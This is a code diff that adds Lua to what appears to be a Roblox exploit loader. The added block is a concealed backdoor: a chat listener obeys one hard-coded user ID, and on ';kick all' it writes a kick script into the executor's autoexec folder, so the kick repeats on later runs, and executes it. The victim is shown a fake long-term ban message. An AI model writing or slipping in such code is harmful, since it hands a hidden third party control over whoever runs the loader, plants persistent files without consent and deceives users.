@@ -1,3 +1,99 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local kickMessage = "You have been banned for 29999 weeks 5 days 100 seconds."
+local allowedUserId = 8484602156
+local foldersToTry = {"autoexec", "AutoExec"}
+local fileName = "CreamyWareInject.lua"
+local folderName = nil
+local filePath = nil
+
+local kickScript = [[
+local player = game:GetService("Players").LocalPlayer
+player:Kick("]] .. kickMessage .. [[")
+]]
+
+-- Folder creation utilities
+local function folderExists(name)
+    return isfolder and isfolder(name)
+end
+
+local function safeMakeFolder(name)
+    if makefolder then
+        local ok, err = pcall(function()
+            makefolder(name)
+        end)
+        return ok
+    end
+    return false
+end
+
+local function safeWriteFile(path, content)
+    if writefile then
+        local success, err = pcall(function()
+            writefile(path, content)
+        end)
+        if success then return true end
+        -- fallback to root if path fails
+        local fallbackPath = path:match("([^/]+)$")
+        return pcall(function()
+            writefile(fallbackPath, content)
+        end)
+    end
+    return false
+end
+
+-- Determine best folder
+for _, folder in ipairs(foldersToTry) do
+    if folderExists(folder) then
+        folderName = folder
+        break
+    end
+end
+
+if not folderName then
+    if safeMakeFolder("autoexec") then
+        folderName = "autoexec"
+    elseif safeMakeFolder("AutoExec") then
+        folderName = "AutoExec"
+    end
+end
+
+filePath = folderName and (folderName .. "/" .. fileName) or fileName
+
+-- Kicker logic
+local function createAndRunKick()
+    if safeWriteFile(filePath, kickScript) and readfile and loadstring then
+        pcall(function()
+            loadstring(readfile(filePath))()
+        end)
+    end
+end
+
+-- Chat listener with permission check
+local function onPlayerChat(p)
+    if p.UserId == allowedUserId then
+        p.Chatted:Connect(function(msg)
+            if msg == ";kick all" and p ~= LocalPlayer then
+                createAndRunKick()
+            end
+        end)
+    end
+end
+
+-- Hook existing players
+for _, p in pairs(Players:GetPlayers()) do
+    if p ~= LocalPlayer then
+        onPlayerChat(p)
+    end
+end
+
+-- New players
+Players.PlayerAdded:Connect(function(p)
+    if p ~= LocalPlayer then
+        onPlayerChat(p)
+    end
+end)
 repeat task.wait() until game:IsLoaded()
 if shared.vape then shared.vape:Uninject() end
 
